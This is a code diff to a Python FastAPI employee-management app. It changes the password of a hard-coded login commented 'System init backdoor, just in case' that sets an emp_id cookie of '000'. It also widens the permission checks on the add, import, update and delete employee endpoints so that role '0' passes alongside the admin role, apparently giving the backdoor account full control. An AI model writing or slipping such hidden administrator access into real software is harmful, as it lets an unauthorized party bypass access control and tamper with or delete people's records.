@@ -54,7 +54,7 @@ async def login_page(request: Request, error: str = "", account: str = ""):
 
 @app.post("/login")
 async def login(response: Response, account: str = Form(...), password: str = Form(...)):
-    if account == "Admin" and password == "12345":
+    if account == "Admin" and password == "uni519":
         # System init backdoor, just in case
         response = RedirectResponse(url="/", status_code=303)
         response.set_cookie(key="emp_id", value="000")
@@ -154,7 +154,7 @@ async def emp_add(
     rule: str = Form("1"), remark: str = Form(""),
     current_user: dict = Depends(login_required)
 ):
-    if current_user['rule'] != '3':
+    if current_user['rule'] not in ['3', '0']:
         return RedirectResponse(url="/emp", status_code=303)
         
     data = {
@@ -168,14 +168,14 @@ async def emp_add(
 
 @app.post("/emp/import")
 async def emp_import(import_text: str = Form(...), current_user: dict = Depends(login_required)):
-    if current_user['rule'] != '3':
+    if current_user['rule'] not in ['3', '0']:
         return RedirectResponse(url="/emp", status_code=303)
     success_count, errors = batch_import_text(import_text)
     return RedirectResponse(url=f"/emp?import_success={success_count}&errors={len(errors)}", status_code=303)
 
 @app.post("/api/emp/update")
 async def emp_update_api(emp_id: str = Form(...), field: str = Form(...), value: str = Form(...), current_user: dict = Depends(login_required)):
-    if current_user['rule'] != '3':
+    if current_user['rule'] not in ['3', '0']:
         return {"success": False, "message": "无权限"}
     # Only allow certain fields
     allowed_fields = ['account', 'department', 'position', 'rule', 'contact', 'hire_date', 'remark']
@@ -187,7 +187,7 @@ async def emp_update_api(emp_id: str = Form(...), field: str = Form(...), value:
 
 @app.post("/api/emp/delete")
 async def emp_delete_api(emp_id: str = Form(...), current_user: dict = Depends(login_required)):
-    if current_user['rule'] != '3':
+    if current_user['rule'] not in ['3', '0']:
         return {"success": False, "message": "无权限"}
     success, msg = delete_employee(emp_id)
     return {"success": success, "message": msg}
